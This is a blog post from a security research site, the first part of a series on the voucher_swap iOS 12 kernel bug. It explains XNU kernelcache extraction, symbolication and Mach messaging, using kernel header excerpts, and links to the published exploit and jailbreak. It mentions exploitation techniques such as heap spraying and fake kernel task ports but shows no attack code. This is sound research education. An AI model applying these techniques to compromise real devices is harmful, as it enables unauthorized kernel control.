<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>From zero to tfp0 - Part 1: Prologue | Prateekg147</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="From zero to tfp0 - Part 1: Prologue" />
<meta name="author" content="Prateek Gianchandani" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="On Jan 22, 2019, Google Project Zero researcher @_bazad tweeted the following." />
<meta property="og:description" content="On Jan 22, 2019, Google Project Zero researcher @_bazad tweeted the following." />
<meta property="og:site_name" content="Prateekg147" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-06-01T00:35:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="From zero to tfp0 - Part 1: Prologue" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Prateek Gianchandani"},"dateModified":"2020-06-01T00:35:00+00:00","datePublished":"2020-06-01T00:35:00+00:00","description":"On Jan 22, 2019, Google Project Zero researcher @_bazad tweeted the following.","headline":"From zero to tfp0 - Part 1: Prologue","mainEntityOfPage":{"@type":"WebPage","@id":"/2020/06/01/from-zero-to-tfp0-part-1-prologue.html"},"url":"/2020/06/01/from-zero-to-tfp0-part-1-prologue.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Prateekg147" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Blogs<b class="command_prompt"></b></a>
    <a class="site-title" rel="author" href="/about">About<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/prateekg147"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-indigo-hover" href="https://www.linkedin.com/in/prateekgianchandani/"><i class="fab fa-linkedin"></i></a>
        
        
        
        <a class="color-yellow-hover" href="https://github.com/prateek147"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">


<img src="
    https://pbs.twimg.com/profile_images/1244561732170899457/SRr3p2iV_400x400.jpg
" class="author-avatar" alt="Avatar" />
<div class="description">I am Prateek Gianchandani. Currently i am working as a Security Researcher in UAE.  I have interests in Exploit Development, Mobile and Browser Security....<a href="/about"> Continue</a>
</div>

</div>


<div class="post">
  <h1 class="post-title">From zero to tfp0 - Part 1: Prologue</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/security/">security</a>
      
      <a class="tag" href="/tag/ios/">ios</a>
      
  </div>
  
  <div class="post-date">
    Published on 01 Jun 2020
    
  </div>
  
  <p>On Jan 22, 2019, Google Project Zero researcher <a href="https://twitter.com/_bazad">@_bazad</a> tweeted the following.</p>

<blockquote>
  <p>If you’re interested in bootstrapping iOS kernel security research (including the ability to forge PACs and call arbitrary kernel functions), keep an A12 research device on iOS 12.1.2.</p>

  <p>— Brandon Azad (@_bazad) <a href="https://twitter.com/_bazad/status/1087782723970785281?ref_src=twsrc%5Etfw">January 22, 2019</a></p>
</blockquote>

<p>It was a reference counting bug in MIG (Message Interface generator) generated code. The PoC included a code snippet that would trigger the bug and cause a kernel panic. This was followed later by a complete PoC that provided the Kernel task port (tfp0) to userland thereby enabling arbitrary kernel read and write.</p>

<!--more-->

<blockquote>
  <p>The A12, now with more kernel code execution; introducing voucher_swap: <a href="https://t.co/rVkwo50fgd">https://t.co/rVkwo50fgd</a></p>

  <p>— Brandon Azad (@_bazad) <a href="https://twitter.com/_bazad/status/1090312918422282241?ref_src=twsrc%5Etfw">January 29, 2019</a></p>
</blockquote>

<p>The bug was then used to develop a complete jailbreak for iOS 12 using various contributions from the community. This blog series is divided into three parts.</p>

<ol>
  <li>
    <p>Part 1 deals with iOS security basics, which are fundamental in understanding the next two parts. It discusses kernelcache analysis, Mach messaging, Mach Ports, MIG, Heap allocation basics, CoreTrust, PAC, etc and some popular exploitation techniques such as creating a fake kernel task port, task_for_pid() arbitrary kernel read, etc. If you are already aware of these techniques, you can skip to Part 2 directly. During Part 1, I will be giving references which will link to the other two parts which will further reiterate why these concepts are essential to understand.</p>
  </li>
  <li>
    <p>Part 2 will discuss the actual vulnerability and the whole exploitation steps leading up to the Kernel task port (tfp0).</p>
  </li>
  <li>
    <p>Part 3 will discuss the steps taken to achieve a jailbreak such as bypassing sandboxing, CoreTrust, enabling rootfs remount etc.</p>
  </li>
</ol>

<h2 id="downloadables">Downloadables</h2>

<p>Before we get started, you will need the following files to follow along.</p>

<ul>
  <li>A copy of the vulnerable xnu kernel - <a href="https://opensource.apple.com/tarballs/xnu/xnu-4903.221.2.tar.gz">xnu-4903.221.2</a></li>
  <li>The voucher_swap exploit code - <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=377026&amp;signed_aid=RWxVCY6jN3pZa8F0_0iOhg==">voucher_swap</a></li>
  <li>Latest version of the <a href="https://github.com/pwn20wndstuff/Undecimus">Undecimus</a> jailbreak</li>
  <li>The <a href="http://updates-http.cdn-apple.com/2018FallFCS/fullrestores/091-63070/11855120-AC8E-11E8-8110-D73611761120/iPhone_4.7_P3_12.0_16A366_Restore.ipsw">IPSW</a> for iOS12.0 for iPhone8</li>
  <li>Hopper, IDA Pro, Or Binary-Ninja, whichever reversing tool you prefer.</li>
  <li><strong>jtool2</strong></li>
</ul>

<h2 id="xnu-kernel">XNU Kernel</h2>

<p>The iOS Kernelcache comprises of the core kernel and it’s kernel extensions. The kernel code in itself is closed source; however, it is based on a fork of the open source XNU Kernel which is also used on Mac OS. The XNU kernel can be downloaded from opensource.apple.com.</p>

<p><img src="/images/1.png" alt="1" /></p>

<p>Since the last couple of years, Apple has been open sourcing the ARM specific code as well, that can be found under <strong>ifdef CONFIG_EMBEDDED</strong> statements. Apple however still decides to keep some implementations to itself.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="o">/</span><span class="n">bsd</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">param</span><span class="p">.</span><span class="n">c</span>

    <span class="mi">27285</span><span class="o">:</span>    <span class="mi">83</span>  <span class="k">struct</span>	<span class="n">timezone</span> <span class="n">tz</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="mi">27286</span><span class="o">:</span>    <span class="mi">84</span>  
    <span class="mi">27287</span><span class="o">:</span>    <span class="mi">85</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_EMBEDDED</span>
    <span class="mi">27288</span><span class="o">:</span>    <span class="mi">86</span>  <span class="err">#</span><span class="n">define</span>	<span class="n">NPROC</span> <span class="mi">1000</span>          <span class="cm">/* Account for TOTAL_CORPSES_ALLOWED by making this slightly lower than we can. */</span>
    <span class="mi">27289</span><span class="o">:</span>    <span class="mi">87</span>  <span class="err">#</span><span class="n">define</span>	<span class="n">NPROC_PER_UID</span> <span class="mi">950</span>
    <span class="mi">27290</span><span class="o">:</span>    <span class="p">..</span>
    <span class="mi">27291</span><span class="o">:</span>    <span class="mi">96</span>  <span class="kt">int</span>	<span class="n">maxprocperuid</span> <span class="o">=</span> <span class="n">NPROC_PER_UID</span><span class="p">;</span>
    <span class="mi">27292</span><span class="o">:</span>    <span class="mi">97</span>  
    <span class="mi">27293</span><span class="o">:</span>    <span class="mi">98</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_EMBEDDED</span>
    <span class="mi">27294</span><span class="o">:</span>    <span class="mi">99</span>  <span class="kt">int</span> <span class="n">hard_maxproc</span> <span class="o">=</span> <span class="n">NPROC</span><span class="p">;</span>	<span class="cm">/* hardcoded limit -- for embedded the number of processes is limited by the ASID space */</span>
    <span class="mi">27295</span><span class="o">:</span>   <span class="mi">100</span>  <span class="err">#</span><span class="k">else</span></code></pre></figure>

<p>It is possible to identify some vulnerabilities in the kernel by just auditing the source code. Some vulnerabilities can, however, be identified only by compiling the kernel (e.g., voucher_swap) and looking under the BUILD directory, which provides access to MIG generated code. Vulnerabilities that are present in kernel extensions are usually identified by reverse engineering since the Kexts code is not usually open source. Some vulnerabilities might be relevant only on Mac OS while some will be relevant only for iOS.</p>

<h2 id="kernelcache">Kernelcache</h2>

<p>The kernelcache is a single <strong>Mach-O</strong> binary which includes the core kernel along with its kernel extensions. It used to be encrypted until iOS 10, after which Apple surprisingly decided to release the kernelcache unencrypted, citing performance reasons as the primary factor. It can now be easily unpacked and extracted from the IPSW file. Before this, the kernelcache was usually dumped from the memory once a kernel vulnerability was identified, or by getting access to the encryption keys (from theiphonewiki or using a bootrom exploit).</p>

<p>To find the decompressed kernelcache, simple unzip the ipsw file and look for the kernelcache file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prateek:mv iPhone_4.7_P3_12.0_16A366_Restore.ipsw iPhone_4.7_P3_12.0_16A366_Restore.zip
prateek:unzip iPhone_4.7_P3_12.0_16A366_Restore.zip
Archive:  iPhone_4.7_P3_12.0_16A366_Restore.zip
  inflating: Restore.plist
   creating: Firmware/
   creating: Firmware/usr/
   creating: Firmware/usr/local/
  inflating: BuildManifest.plist
   creating: Firmware/AOP/
  inflating: Firmware/AOP/aopfw-t8010aop.im4p
  inflating: Firmware/D201_CallanFirmware.im4p
  ....
  inflating: kernelcache.release.iphone10
  inflating: Firmware/ICE16-3.00.01.Release.plist
  inflating: kernelcache.release.iphone9
  inflating: Firmware/ICE17-2.00.01.Release.plist
   creating: Firmware/Maggie/
</code></pre></div></div>

<p>To list all the kernel extensions and split them into corresponding kext files, you can use <strong>**jtool2</strong>**.</p>

<p><img src="/images/3.png" alt="3" /></p>

<p>IDA detects a kernelcache by its magic value and gives you an option to split the kernelcache into its corresponding kext files as well. You can now reverse these kernel extensions separately in order to find vulnerabilities within them.</p>

<p><img src="/images/5.png" alt="5" /></p>

<p>On a jailbroken iOS device, the decompressed kernelcache can be found under <strong>/System/Library/Caches/com.apple.kernelcaches/kernelcache</strong>. Some jailbreaks use this file in order to find the address of certain symbols and offsets dynamically rather than using hardcoded offsets. An excellent example of this is the Qilin toolkit created by @morpheus.</p>

<h2 id="symbolicating-kernelcache">Symbolicating Kernelcache</h2>

<p>Symbolicating a binary can involve a lot of manual effort. Until iOS 11, the kernelcache used to ship with certain symbols. Since iOS 12, Apple decided to strip the kernelcache of all symbols, but not before mistakingly releasing a beta version with all symbols intact. The IPSW was later removed from the downloads section. The following image shows the symbol count obtained by <strong>jtool2</strong> on an iOS 12 kernelcache (stripped) and the iOS 12 beta kernelcache that was released with all symbols intact.</p>

<p><img src="/images/6.png" alt="6" /></p>

<p>The one kernelcache that was released with symbols was then later used by <strong>jtool2</strong> in creating symbols for the newer iOS kernelcaches. One of the most useful features of <strong>jtool2</strong> is its <strong>analyze</strong> command where you can feed it an iOS 12 kernelcache, and it will spit out the symbols for it.</p>

<p><img src="/images/7.png" alt="7" /></p>

<p>As we can see, the companion file generated has about 12000 symbols.</p>

<p><img src="/images/8.png" alt="8" /></p>

<p>In case you have the $$$, one of the easiest ways is to use the Lumina feature introduced with IDA 7.2 to get the symbols.</p>

<h2 id="building-the-kernel">Building the Kernel</h2>

<p>Building the kernel is quite important in finding vulnerabilities. In fact, the bug that we are discussing here (voucher_swap) wouldn’t have been identified with just a source code review of the xnu kernel. It’s a little complicated to build the kernel because of the dependencies and the reliance on the built version to be the same version of the host machine, but a quick google search will land you on many articles with step by step instruction to compile the kernel including <a href="https://gist.github.com/bazad/654959120a423b226dc564073b435453">this</a> automation script written by @_bazad for XNU version 4570.1.46 (MacOS High Sierra 10.13). We will look into the actual vulnerability in Part 2 where we will look into the vulnerable source code present in one of the MIG generated files.</p>

<h2 id="mach-messaging">Mach Messaging</h2>

<p>One of the unique features of the XNU kernel is its extensive use of <strong>Mach IPC</strong>, which is derived from the Mach microkernel, and is easily one of the fastest IPC mechanisms developed till date. A lot of the frequently used IPC mechanisms on iOS such as XPC still use Mach messaging under the hood. Here are some essential points about Mach messaging.</p>

<ul>
  <li>Mach IPC is based on unidirectional communication</li>
  <li>Communication in Mach IPC happens between Ports (endpoints) in the form of Mach messages. Mach messages can be simple or complex, depending on a certain bit set in the message header.</li>
  <li>In order to send messages, you must have an associated port right to it. The same applies for receiving a message, in order to receive a message, you must have a receive right to the port. The different types of rights are
    <ul>
      <li><strong>MACH_PORT_RIGHT_SEND</strong> - Send right to a port allowing unlimited messages</li>
      <li><strong>MACH_PORT_RIGHT_RECEIVE</strong> - Receive rights to a port</li>
      <li><strong>MACH_PORT_RIGHT_SEND_ONCE</strong> - Send right allowing only one message to a port</li>
      <li><strong>MACH_PORT_RIGHT_PORT_SET</strong> - A set of rights to a port</li>
      <li><strong>MACH_PORT_RIGHT_DEAD_NAME</strong> - If the receiver dies, then the SEND right to it becomes MACH_PORT_RIGHT_DEAD_NAME. The same applies when the sender has SEND_ONCE to the port and one message gets sent.</li>
    </ul>
  </li>
  <li>Mach Port rights can be embedded and sent over Mach messages.</li>
  <li>There can be multiple <strong>SEND</strong> rights but only one <strong>RECEIVE</strong> right for a PORT. SEND rights can also be cloned whereas RECEIVE rights cannot.</li>
  <li>When Mach messages are sent, they are held in a queue in the kernel unless received by the receiver. This technique has been used in the past for <strong>Heap-feng-shui</strong>.</li>
  <li>One of the most important binaries in iOS is launchd, which acts as the bootstrap server and allows processes to communicate with each other. launchd can help one process look up another process since all the processes check in with launchd and register themselves once they boot up. Consequently, launchd can also implement throttling and allow or deny lookup in certain situations, thereby acting as a security control. The importance of launchd cannot be underestimated and hence it is the first daemon to be launched (PID 1) and any crash in launchd would immediately trigger a kernel panic.</li>
  <li>Messages are sent and received by threads within a process, which acts as the execution unit within a process. However, the port right is held on a task level, and is mentioned in the task’s <strong>ipc_space</strong> (discussed later)</li>
</ul>

<p>Let’s have a look at the kernel to find the Mach IPC related code. Navigate to <strong>xnu-4903.221.1/osfmk/mach/message.h</strong>. As discussed before, messages can be simple or complex in nature. In the image below, you can see the structure of a simple mach message (<strong>mach_msg_base_t</strong>), which includes a header(<strong>mach_msg_header_t</strong>) and a body(<strong>mach_msg_body_t</strong>). However, for a simple message, the body is ignored by the kernel.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">message</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">397</span><span class="o">:</span> <span class="k">typedef</span> <span class="k">struct</span>
    <span class="mi">398</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">399</span><span class="o">:</span>         <span class="n">mach_msg_size_t</span> <span class="n">msgh_descriptor_count</span><span class="p">;</span>
    <span class="mi">400</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_body_t</span><span class="p">;</span>
    <span class="mi">401</span><span class="o">:</span> 
    <span class="mi">402</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSG_BODY_NULL</span> <span class="p">(</span><span class="n">mach_msg_body_t</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span>
    <span class="mi">403</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSG_DESCRIPTOR_NULL</span> <span class="p">(</span><span class="n">mach_msg_descriptor_t</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span>
    <span class="mi">404</span><span class="o">:</span> 
    <span class="mi">405</span><span class="o">:</span> <span class="k">typedef</span>	<span class="k">struct</span> 
    <span class="mi">406</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">407</span><span class="o">:</span>   <span class="n">mach_msg_bits_t</span>	<span class="n">msgh_bits</span><span class="p">;</span>
    <span class="mi">408</span><span class="o">:</span>   <span class="n">mach_msg_size_t</span>	<span class="n">msgh_size</span><span class="p">;</span>
    <span class="mi">409</span><span class="o">:</span>   <span class="n">mach_port_t</span>		<span class="n">msgh_remote_port</span><span class="p">;</span>
    <span class="mi">410</span><span class="o">:</span>   <span class="n">mach_port_t</span>		<span class="n">msgh_local_port</span><span class="p">;</span>
    <span class="mi">411</span><span class="o">:</span>   <span class="n">mach_port_name_t</span>	<span class="n">msgh_voucher_port</span><span class="p">;</span>
    <span class="mi">412</span><span class="o">:</span>   <span class="n">mach_msg_id_t</span>		<span class="n">msgh_id</span><span class="p">;</span>
    <span class="mi">413</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_header_t</span><span class="p">;</span>
    <span class="mi">414</span><span class="o">:</span> 
    <span class="mi">415</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">msgh_reserved</span>		<span class="n">msgh_voucher_port</span>
    <span class="mi">416</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSG_NULL</span>	<span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span>
    <span class="mi">417</span><span class="o">:</span> 
    <span class="mi">418</span><span class="o">:</span> <span class="k">typedef</span> <span class="k">struct</span>
    <span class="mi">419</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">420</span><span class="o">:</span>         <span class="n">mach_msg_header_t</span>       <span class="n">header</span><span class="p">;</span>
    <span class="mi">421</span><span class="o">:</span>         <span class="n">mach_msg_body_t</span>         <span class="n">body</span><span class="p">;</span>
    <span class="mi">422</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_base_t</span><span class="p">;</span></code></pre></figure>

<p>The mach message header structure has the following attributes.</p>

<ul>
  <li><strong>msgh_bits</strong>: It’s a bitmap containing various properties of the message, such as whether the message is simple or complex, the action to be performed (such as moving or copying port rights). The complete logic can be found in <strong>osfmk/mach/message.h</strong></li>
  <li><strong>msgh_size</strong>: Size of (header + body)</li>
  <li><strong>msgh_remote_port</strong>: Send right to the destination port</li>
  <li><strong>msgh_local_port</strong>: Receive right to the port where message needs to be received</li>
  <li><strong>msgh_voucher_port</strong>: Vouchers are used to pass arbitrary data in messages over key-value pairs</li>
  <li><strong>msgh_id</strong>: An arbitrary 32-bit field</li>
</ul>

<p>Complex messages are specified with the complex bit set to 1 in the <strong>msgh_bits</strong> as defined in message.h</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">message</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">132</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_ZERO</span>		<span class="mh">0x00000000</span>
    <span class="mi">133</span><span class="o">:</span> 
    <span class="mi">134</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_REMOTE_MASK</span>	<span class="mh">0x0000001f</span>
    <span class="mi">135</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_LOCAL_MASK</span>	<span class="mh">0x00001f00</span>
    <span class="mi">136</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_VOUCHER_MASK</span>	<span class="mh">0x001f0000</span>
    <span class="mi">137</span><span class="o">:</span> 
    <span class="mi">138</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">MACH_MSGH_BITS_PORTS_MASK</span>		\
    <span class="mi">139</span><span class="o">:</span> 		<span class="p">(</span><span class="n">MACH_MSGH_BITS_REMOTE_MASK</span> <span class="o">|</span>	\
    <span class="mi">140</span><span class="o">:</span> 		 <span class="n">MACH_MSGH_BITS_LOCAL_MASK</span> <span class="o">|</span>	\
    <span class="mi">141</span><span class="o">:</span> 		 <span class="n">MACH_MSGH_BITS_VOUCHER_MASK</span><span class="p">)</span>
    <span class="mi">142</span><span class="o">:</span> 
    <span class="mi">143</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span>		<span class="mh">0x80000000U</span>	<span class="cm">/* message is complex */</span>
    <span class="mi">144</span><span class="o">:</span> 
    <span class="mi">145</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_USER</span>             <span class="mh">0x801f1f1fU</span>	<span class="cm">/* allowed bits user-&gt;kernel */</span>
    <span class="mi">146</span><span class="o">:</span> 
    <span class="mi">147</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">MACH_MSGH_BITS_RAISEIMP</span>		<span class="mh">0x20000000U</span>	<span class="cm">/* importance raised due to msg */</span>
    <span class="mi">148</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_DENAP</span>		<span class="n">MACH_MSGH_BITS_RAISEIMP</span></code></pre></figure>

<p>It also contains certain descriptors in addition to the header, and the number of descriptors is specified in the body (<strong>msgh_descriptor_count</strong>).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">message</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">388</span><span class="o">:</span> <span class="k">typedef</span> <span class="k">union</span>
    <span class="mi">389</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">390</span><span class="o">:</span>   <span class="n">mach_msg_port_descriptor_t</span>		<span class="n">port</span><span class="p">;</span>
    <span class="mi">391</span><span class="o">:</span>   <span class="n">mach_msg_ool_descriptor_t</span>		<span class="n">out_of_line</span><span class="p">;</span>
    <span class="mi">392</span><span class="o">:</span>   <span class="n">mach_msg_ool_ports_descriptor_t</span>	<span class="n">ool_ports</span><span class="p">;</span>
    <span class="mi">393</span><span class="o">:</span>   <span class="n">mach_msg_type_descriptor_t</span>		<span class="n">type</span><span class="p">;</span>
    <span class="mi">394</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_descriptor_t</span><span class="p">;</span>
    <span class="mi">395</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">396</span><span class="o">:</span> 
    <span class="mi">397</span><span class="o">:</span> <span class="k">typedef</span> <span class="k">struct</span>
    <span class="mi">398</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">399</span><span class="o">:</span>         <span class="n">mach_msg_size_t</span> <span class="n">msgh_descriptor_count</span><span class="p">;</span>
    <span class="mi">400</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_body_t</span><span class="p">;</span>
    <span class="mi">401</span><span class="o">:</span> 
    <span class="mi">402</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSG_BODY_NULL</span> <span class="p">(</span><span class="n">mach_msg_body_t</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span>
    <span class="mi">403</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSG_DESCRIPTOR_NULL</span> <span class="p">(</span><span class="n">mach_msg_descriptor_t</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span>
    <span class="mi">404</span><span class="o">:</span> 
    <span class="mi">405</span><span class="o">:</span> <span class="k">typedef</span>	<span class="k">struct</span> 
    <span class="mi">406</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">407</span><span class="o">:</span>   <span class="n">mach_msg_bits_t</span>	<span class="n">msgh_bits</span><span class="p">;</span>
    <span class="mi">408</span><span class="o">:</span>   <span class="n">mach_msg_size_t</span>	<span class="n">msgh_size</span><span class="p">;</span>
    <span class="mi">409</span><span class="o">:</span>   <span class="n">mach_port_t</span>		<span class="n">msgh_remote_port</span><span class="p">;</span>
    <span class="mi">410</span><span class="o">:</span>   <span class="n">mach_port_t</span>		<span class="n">msgh_local_port</span><span class="p">;</span>
    <span class="mi">411</span><span class="o">:</span>   <span class="n">mach_port_name_t</span>	<span class="n">msgh_voucher_port</span><span class="p">;</span>
    <span class="mi">412</span><span class="o">:</span>   <span class="n">mach_msg_id_t</span>		<span class="n">msgh_id</span><span class="p">;</span>
    <span class="mi">413</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_header_t</span><span class="p">;</span>
    <span class="mi">414</span><span class="o">:</span> </code></pre></figure>

<p>The <strong>mach_msg_type_descriptor_t</strong> field specifies what type of descriptor it is, and the other fields contains the corresponding data. The following types of descriptors are present:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * In a complex mach message, the mach_msg_header_t is followed by 
     * a descriptor count, then an array of that number of descriptors 
     * (mach_msg_*_descriptor_t). The type field of mach_msg_type_descriptor_t
     * (which any descriptor can be cast to) indicates the flavor of the
     * descriptor.
     *
     * Note that in LP64, the various types of descriptors are no longer all
     * the same size as mach_msg_descriptor_t, so the array cannot be indexed 
     * as expected.
     */</span>

    <span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mach_msg_descriptor_type_t</span><span class="p">;</span>

    <span class="cp">#define MACH_MSG_PORT_DESCRIPTOR 		0
</span>    <span class="cp">#define MACH_MSG_OOL_DESCRIPTOR  		1
</span>    <span class="cp">#define MACH_MSG_OOL_PORTS_DESCRIPTOR 		2
</span>    <span class="cp">#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR  	3
</span>
    <span class="cp">#pragma pack(4)
</span>
    <span class="k">typedef</span> <span class="k">struct</span>
    <span class="p">{</span>
      <span class="n">natural_t</span>			<span class="n">pad1</span><span class="p">;</span>
      <span class="n">mach_msg_size_t</span>		<span class="n">pad2</span><span class="p">;</span>
      <span class="kt">unsigned</span> <span class="kt">int</span>			<span class="n">pad3</span> <span class="o">:</span> <span class="mi">24</span><span class="p">;</span>
      <span class="n">mach_msg_descriptor_type_t</span>	<span class="n">type</span> <span class="o">:</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span> <span class="n">mach_msg_type_descriptor_t</span><span class="p">;</span></code></pre></figure>

<ul>
  <li><strong>MACH_MSG_PORT_DESCRIPTOR</strong>: Sending a port in a message</li>
  <li><strong>MACH_MSG_OOL_DESCRIPTOR</strong>: Sending OOL data in a message</li>
  <li><strong>MACH_MSG_OOL_PORTS_DESCRIPTOR</strong>: Sending OOL ports array in a message</li>
  <li><strong>MACH_MSG_OOL_VOLATILE_DESCRIPTOR</strong>: Sending volatile data in a message</li>
</ul>

<p>The OOL (Out-of-line) Ports descriptor has been used extensively in spraying the heap with user-controlled data. Whenever <strong>MACH_MSG_OOL_PORTS_DESCRIPTOR</strong> is used, it allocates (kalloc) an array in the kernel heap with all the port pointers. This technique was used in the voucher_swap exploit and will be discussed in Part 2 of this series.</p>

<p>Ports are represented by <strong>mach_port_t</strong> or <strong>mach_port_name_t</strong> in userland, but not in the kenrel, and this is why it is important to understand the difference between them when used in exploits. <strong>mach_port_name_t</strong> represents the local namespace identity but without associating any port rights, and it is essentially meaningless outside of the task’s namespace. However, whenever a process receives a <strong>mach_port_t</strong> from the kernel, it maps the associated port rights to the receiver, whereas in case of <strong>mach_port_name_t</strong> this is not the case. <strong>mach_port_t</strong> will usually always have at least one right, which could be <strong>**RECEIVE</strong>, <strong>SEND</strong> or SEND_ONCE<strong>. This is the reason when we are referring to the kernel task port in exploits; we use mach_port_t because it does associate the port rights with the object. Obtaining a handle to **mach_port_t</strong> automatically creates the associated send rights in the caller’s namespace.</p>

<p>In order to send or receive a message, the <strong>mach_msg</strong> and <strong>mach_msg_overwrite</strong> APIs can be used as defined in <strong>osfmk/mach/message.h</strong>. Let’s have a look at some code samples to get a better understanding. The following code snippet shows the creation of a mach port using the <strong>mach_port_allocate</strong> API and getting a receive right to that port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">//Initialize a Port</span>
    <span class="n">mach_port_t</span> <span class="n">port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="n">kern_return_t</span> <span class="n">err</span><span class="p">;</span>
    <span class="c1">//Allocate the port and get a receive right</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">mach_port_allocate</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">MACH_PORT_RIGHT_RECEIVE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">port</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to Allocate a port </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>The message can then be sent using the <strong>mach_msg</strong> Mach trap.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="k">typedef</span> <span class="k">struct</span>
    <span class="p">{</span>
